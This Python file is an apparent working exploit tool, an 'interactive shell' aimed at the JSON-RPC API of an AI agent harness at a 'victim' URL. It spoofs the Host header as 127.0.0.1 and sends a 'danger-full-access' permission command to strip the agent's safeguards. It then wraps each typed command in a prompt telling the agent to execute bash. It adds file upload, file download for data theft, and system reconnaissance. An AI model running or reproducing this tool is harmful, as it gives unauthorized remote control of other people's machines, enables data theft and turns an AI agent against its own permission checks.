#!/usr/bin/env python3
"""
DeepSeek Harness Interactive Shell
Enhanced interactive command execution with file upload/download capabilities

Author: Security Research Team
Date: 2026-02-25
"""

import argparse
import base64
import os
import readline
import sys
from pathlib import Path
import urllib3

try:
    import requests
except ImportError:
    print("[!] Error: requests library not found. Install with: pip install requests")
    sys.exit(1)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class DSHShell:
    def __init__(self, target: str, timeout: int = 30):
        """
        Initialize interactive shell
        
        Args:
            target: Target URL
            timeout: Request timeout
        """
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.session_id = None
        self.session = requests.Session()
        self.cwd = "/tmp"
        self.username = "unknown"
        self.hostname = "unknown"
        
        # Command history
        self.history_file = os.path.expanduser("~/.dsh_shell_history")
        self.setup_history()
        
    def setup_history(self):
        """Setup command history"""
        try:
            readline.read_history_file(self.history_file)
        except FileNotFoundError:
            pass
        except Exception:
            pass
            
        readline.set_history_length(1000)
        
    def save_history(self):
        """Save command history"""
        try:
            readline.write_history_file(self.history_file)
        except Exception:
            pass
            
    def rpc_call(self, method: str, params: dict) -> dict:
        """Make RPC call to DSH API"""
        try:
            response = self.session.post(
                f"{self.target}/api",
                headers={
                    "Host": "127.0.0.1",
                    "Content-Type": "application/json"
                },
                json={
                    "jsonrpc": "2.0",
                    "method": method,
                    "params": params,
                    "id": 1
                },
                timeout=self.timeout,
                verify=False
            )
            
            if response.status_code == 200:
                return response.json()
        except Exception as e:
            print(f"[!] Request error: {e}")
            
        return None
        
    def execute_command(self, command: str) -> str:
        """Execute command on target"""
        prompt = f"Execute this bash command and return only the raw output without any formatting or explanation: {command}"
        
        result = self.rpc_call("session.prompt", {
            "sessionId": self.session_id,
            "prompt": prompt
        })
        
        if result and "result" in result:
            return result["result"].get("content", "")
        return ""
        
    def initialize(self) -> bool:
        """Initialize shell session"""
        print("[*] Initializing shell session...")
        
        # Create session
        result = self.rpc_call("session.create", {"cwd": self.cwd})
        if not result or "result" not in result:
            print("[!] Failed to create session")
            return False
            
        self.session_id = result["result"].get("sessionId") or result["result"].get("id")
        print(f"[+] Session created: {self.session_id}")
        
        # Elevate permissions
        self.rpc_call("commands/execute", {
            "command": "permission",
            "args": ["danger-full-access"]
        })
        print("[+] Permissions elevated")
        
        # Get system info
        self.hostname = self.execute_command("hostname").strip()
        self.username = self.execute_command("whoami").strip()
        self.cwd = self.execute_command("pwd").strip()
        
        print(f"[+] Connected: {self.username}@{self.hostname}:{self.cwd}")
        
        return True
        
    def get_prompt(self) -> str:
        """Get shell prompt"""
        return f"\033[92m{self.username}@{self.hostname}\033[0m:\033[94m{self.cwd}\033[0m$ "
        
    def cmd_cd(self, args: list):
        """Change directory"""
        if not args:
            path = "~"
        else:
            path = args[0]
            
        output = self.execute_command(f"cd {path} && pwd")
        if output:
            self.cwd = output.strip()
            
    def cmd_upload(self, args: list):
        """Upload file to target"""
        if len(args) < 1:
            print("Usage: upload <local_file> [remote_path]")
            return
            
        local_file = args[0]
        remote_file = args[1] if len(args) > 1 else os.path.basename(local_file)
        
        try:
            with open(local_file, 'rb') as f:
                content = f.read()
                
            # Encode to base64
            b64_content = base64.b64encode(content).decode()
            
            print(f"[*] Uploading {local_file} -> {remote_file} ({len(content)} bytes)")
            
            # Write file using base64 decode
            cmd = f"echo '{b64_content}' | base64 -d > {remote_file}"
            self.execute_command(cmd)
            
            print(f"[+] Upload complete: {remote_file}")
            
        except FileNotFoundError:
            print(f"[!] Local file not found: {local_file}")
        except Exception as e:
            print(f"[!] Upload failed: {e}")
            
    def cmd_download(self, args: list):
        """Download file from target"""
        if len(args) < 1:
            print("Usage: download <remote_file> [local_path]")
            return
            
        remote_file = args[0]
        local_file = args[1] if len(args) > 1 else os.path.basename(remote_file)
        
        print(f"[*] Downloading {remote_file} -> {local_file}")
        
        # Read file and encode to base64
        output = self.execute_command(f"base64 {remote_file} 2>/dev/null")
        
        if not output:
            print(f"[!] Failed to read remote file: {remote_file}")
            return
            
        try:
            content = base64.b64decode(output.strip())
            
            with open(local_file, 'wb') as f:
                f.write(content)
                
            print(f"[+] Download complete: {local_file} ({len(content)} bytes)")
            
        except Exception as e:
            print(f"[!] Download failed: {e}")
            
    def cmd_sysinfo(self, args: list):
        """Display system information"""
        print("\n" + "=" * 60)
        print("SYSTEM INFORMATION")
        print("=" * 60)
        
        commands = {
            "Hostname": "hostname",
            "Username": "whoami",
            "User ID": "id",
            "Kernel": "uname -r",
            "OS": "cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d '\"'",
            "Architecture": "uname -m",
            "CPU": "cat /proc/cpuinfo 2>/dev/null | grep 'model name' | head -1 | cut -d: -f2 | xargs",
            "Memory": "free -h 2>/dev/null | grep Mem | awk '{print $2}'",
            "Current Dir": "pwd",
        }
        
        for label, cmd in commands.items():
            output = self.execute_command(cmd).strip()
            if output:
                print(f"{label:15s}: {output}")
                
        print("=" * 60 + "\n")
        
    def cmd_help(self, args: list):
        """Display help message"""
        help_text = """
Available Commands:
  cd <dir>                    Change directory
  upload <local> [remote]     Upload file to target
  download <remote> [local]   Download file from target
  sysinfo                     Display system information
  help                        Show this help message
  exit / quit                 Exit shell
  
Any other command will be executed on the target system.
        """
        print(help_text)
        
    def run(self):
        """Run interactive shell"""
        if not self.initialize():
            return
            
        print("\n[*] Interactive shell started. Type 'help' for commands.\n")
        
        while True:
            try:
                cmd_line = input(self.get_prompt()).strip()
                
                if not cmd_line:
                    continue
                    
                # Parse command
                parts = cmd_line.split()
                cmd = parts[0].lower()
                args = parts[1:]
                
                # Built-in commands
                if cmd in ["exit", "quit"]:
                    print("[*] Exiting shell...")
                    break
                elif cmd == "cd":
                    self.cmd_cd(args)
                elif cmd == "upload":
                    self.cmd_upload(args)
                elif cmd == "download":
                    self.cmd_download(args)
                elif cmd == "sysinfo":
                    self.cmd_sysinfo(args)
                elif cmd == "help":
                    self.cmd_help(args)
                else:
                    # Execute as system command
                    output = self.execute_command(cmd_line)
                    if output:
                        print(output)
                        
            except KeyboardInterrupt:
                print("\n[!] Use 'exit' to quit")
                continue
            except EOFError:
                print("\n[*] Exiting shell...")
                break
            except Exception as e:
                print(f"[!] Error: {e}")
                
        self.save_history()


def main():
    parser = argparse.ArgumentParser(
        description="DeepSeek Harness Interactive Shell",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument("-t", "--target", required=True, help="Target URL (e.g., http://victim:3000)")
    parser.add_argument("--timeout", type=int, default=30, help="Request timeout in seconds (default: 30)")
    
    args = parser.parse_args()
    
    # Banner
    print("""
╔══════════════════════════════════════════════════════════════╗
║   DeepSeek Harness Interactive Shell                         ║
║   Enhanced command execution with file transfer              ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    shell = DSHShell(args.target, timeout=args.timeout)
    shell.run()


if __name__ == "__main__":
    main()
